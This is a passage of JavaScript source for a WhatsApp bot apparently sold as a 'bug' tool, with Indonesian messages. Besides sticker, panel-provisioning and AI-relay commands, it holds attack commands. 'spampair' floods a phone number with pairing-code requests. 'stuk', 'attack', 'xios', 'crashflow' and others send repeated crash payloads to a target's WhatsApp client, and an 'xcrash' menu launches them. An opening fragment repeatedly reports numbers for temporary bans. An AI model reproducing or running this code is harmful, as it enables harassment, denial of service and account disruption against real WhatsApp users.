
if (res.reason === 'temporarily_unavailable') {
console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}

numbers[fullNo] = { cCode, number };
fs.writeFileSync('./lib/tempban.json', JSON.stringify(numbers, null, '\t'));
setInterval(() => {
dropNumber()
}, 400)
}
break

case 'spampair': {
const usePairingCode = true
const NodeCache = require("node-cache")
const resolveMsgBuffer = new NodeCache()
			if (!isOwner) return
			if (!q) return reply(`*Syntax Error!*\n\n_Use : Spampair NUMBER|AMOUNT_\n_Example : Spampair 62xx_`)
			let [peenis, pepekk = "200"] = q.split("|")
			await reply(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️`)
			await reaction(m.chat, "✅")
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('@whiskeysockets/baileys')
			let {
				state
			} = await useMultiFileAuthState('pairSess')
			let {
				version
			} = await fetchLatestBaileysVersion()
			let sucked = await makeWaSocket({
				auth: state,
				browser: ['Mac Os', 'chrome', '121.0.6167.159'],
version: [2, 2413, 1],
keepAliveIntervalMs: 50000,
printQRInTerminal: !usePairingCode,
generateHighQualityLinkPreview: true,
resolveMsgBuffer,
				logger: pino({ level: "silent" }),
					level: 'fatal'
				})
			for (let i = 0; i < pepekk; i++) {
			await sleep(2000)
				let prc = await sucked.requestPairingCode(target)
				await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
			}
			await sleep(2000)
		}
		break

case 'antibugon': {
if (!isOwner) return reply("Fitur Khusus User Tertentu!!") 
global.antibug = true
return reply('sukses mengaktifkan antibug')
}
break

case 'antibugoff': {
if (!isOwner) return reply("Fitur Khusus User Tertentu!!") 
global.antibug = false
return reply('sukses menonaktifkan antibug')
}
break

case 'clearchat': {
pee = "\n".repeat(1000)
return reply(pee + '😁🖕')
}
break

case 'katakatajack': {
if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
await zyn.sendMessage(m.chat, {text: `tetaplah semangat jangan putus asa karna kejamnya dunia ini paham!!! by JALLMODS`},{quoted: m})
sleep(2000)
return reply(`🥶`)
}
break

case 'done': case 'd': {
if (!isOwner) return reply(`Njirr Sok Asik lu`)
let s = text.split(',')
let barang = s[0]
let nominal = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} barang,nominal`)
if (!barang) return reply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} vipies,60000`)
if (!nominal) return reply(`Ex : ${prefix+command} barang,nominal\n\nContoh :\n${prefix+command} panel,1000`)
text_done = `「 𝗧𝗥𝗔𝗡𝗦𝗔𝗞𝗦𝗜 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟 」

📦 Barang : ${barang}
💸 Nominal : ${nominal}
📆 Tanggal : ${wib}
🕰️ Waktu : ${time2}
✨ Status : Berhasil

𝗧𝗲𝗿𝗶𝗺𝗮𝗸𝗮𝘀𝗶𝗵 𝗧𝗲𝗹𝗮𝗵 𝗢𝗿𝗱𝗲𝗿 𝗗𝗶 *${storename}*`
await zyn.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: `${nominal}*100000`,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: text_done,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break

case "sticker": 
case "stiker":
case "s": {
if (!isOwner) return reply(mess.only.owner)
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await zyn.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await zyn.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break

case 'stuk': case 'flow': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
break

case 'fuck': case 'tzy': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
break

case 'vip': case 'attack': case 'andro': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
break

case 'xios': case 'iphone': case 'xip':
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
break

case 'overflow': case 'vasion': case 'crashflow': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
break

case "owner": {
if (!isPremium) return reply('Mau Ngapain Dek ??')
const repf = await zyn.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
zyn.sendMessage(from, { text : `Nih Owner Gw Jangan Macem"`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break

case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await zyn.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break

case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break

case 'setowner': {
if (!isOwner) return reply('kusus owner')
if (!text) return reply(`Contoh : ${prefix + command} 62×××`)
global.owner = text.split("|")[0]
 reply(`Exif berhasil diubah menjadi\n\n• No Owner : ${global.owner}`)
}
break

case 'self': {
if (!isOwner) return reply(mess.only.owner)
zyn.public = false
reply('Succes Mode Private')
}
break

case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await zyn.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break

case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break

case 'public': {
if (!isOwner) return reply(mess.only.owner)
zyn.public = true
reply('Succes Mode Public')
}
break

case "qc": {
if (!isOwner)return reply(mess.only.owner)
if (!quoted){
const getname = await zyn.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
zyn.sendStimg(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
zyn.sendStimg(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} ZynTzy`)
}
}
break

case 'mangap': {
reply(`Makasi Kakak ${pushname} Atas Pujiannya`) 
}
break

case 'ai': {
	if (!text) return reply(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`);  
await zyn.sendMessage(m.chat, { react: { text: "❄",key: m.key,}}) 
        try {
let gpt = await (await fetch(`https://widipe.com/openai?text=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Zyn - AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./database/image/Xynz.jpg')}, { upload: zyn.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
"buttonParamsJson": `{"display_text":"Nice Zyn - AI","id":".mangap"}`
            }],
          }),
          contextInfo: {
  mentionedJid: [m.sender], 
  forwardingScore: 999,
  isForwarded: true,
forwardedNewsletterMessageInfo: {
  newsletterJid: '0@newsletter',
  newsletterName: namabot,
  serverMessageId: 143
}
}
       })
    }
  }
}, { quoted: m })
await zyn.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("Error Kak :(")
}
}
break

case 'xcrash': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
				let sections = [{
						title: '⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟',
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐙͢𝐧ͯ𝐱𝐈͢𝐯ͮ𝐬 𝐗͢𝟏༑',
							id: `vip ${target}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐗𝐳͢𝐞ͯ𝐭𝐬 𝐗͢𝟐༑',
							id: `andro ${target}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐈𝐧ͮ͢𝐕𝐢𝐬ͯ͢𝐢𝐗 𝐗͢𝟕༑',
							id: `attack ${target}`
						}]
					},
					{
						title: '⌜ 𝐈𝚯𝐒 ⌟',
						highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
							id: `xios ${target}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
							id: `xip ${target}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
						rows: [{
							title: '𝐓𝐫𝐚𝐯𝐚 𝐈𝐨𝐬',
							id: `iphone ${target}`
						}]
					},
					{
						title: '⌜ 𝐙𝐍𝐗 ⌟',
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐂͢𝐫𝐚ͯ𝐬͢𝐡𝐅𝐥͢𝐨ͮ𝐰༑',
							id: `crashflow ${target}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝐕͢𝐚ͯ𝐒𝐢͢𝐨ͮ𝐧༑',
							id: `vasion ${target}`
						}]
					},
					{
						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
						rows: [{
							title: '⌁⃰𝚯𝐯ͯ͢𝐞𝐫ͮ𝐅𝐥͢𝐨ͯ𝐰༑',
							id: `overflow ${target}`
						}]
					}]
let listMessage = {
    title: '𝐕𝐗𝚯 ❄ 𝐙𝐀𝚸', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "0@newsletter",
 newsletterName: 'Powered By JackTzy', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: zyn.decodeJid(zyn.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: (`\n🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠\n›› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${target}`)
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ``
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: '',
 subtitle: "𝐙𝐲𝐧𝐓𝐳𝐲",
 hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/xbug.jpg")}, { upload: zyn.waUploadToServer })) 
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
},  {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\"}"
 },
 ]
 })
 })
 }
 }
}, {})

await zyn.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'hdvid' :
case 'hdvideo': 
case 'vidiohd':
case 'tohd': 
case 'vidhd' : {
const { TelegraPh } = require('../database/lib//uploader');
const { exec } = require('child_process');
const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? zyn.user.jid : m.sender;
//const name = await zyn.getName(who);
const q = m.quoted ? m.quoted : m;
const mime = (q.msg || q).mimetype || '';
if (!mime) return m.reply(`Mana vidio nya bang?`);
reply(mess.wait);
const media = await zyn.downloadAndSaveMediaMessage(q);
const url = await TelegraPh(media);
const output = 'output.mp4'; // Nama file output
// Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);

  // Mengunggah video yang telah ditingkatkan resolusinya
  zyn.sendMessage(m.chat, { caption: `_Success To HD Video_`, video: { url: output }}, {quoted: m});
})
await sleep(60000)
fs.unlinkSync(output)
fs.unlinkSync(media)
}
break

case 'enc': case 'encrypt': case 'obfuscate':
{
if (!q) return reply(`Contoh ${prefix+command} const time = require('money')`)
let meg = await obfus(q)
reply(`${meg.result}`)
}
break

case '1gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "50"
let disk = "1024"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '2gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "2024"
let cpu = "70"
let disk = "2024"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '3gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "3024"
let cpu = "80"
let disk = "3024"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '4gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "4024"
let cpu = "80"
let disk = "4024"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
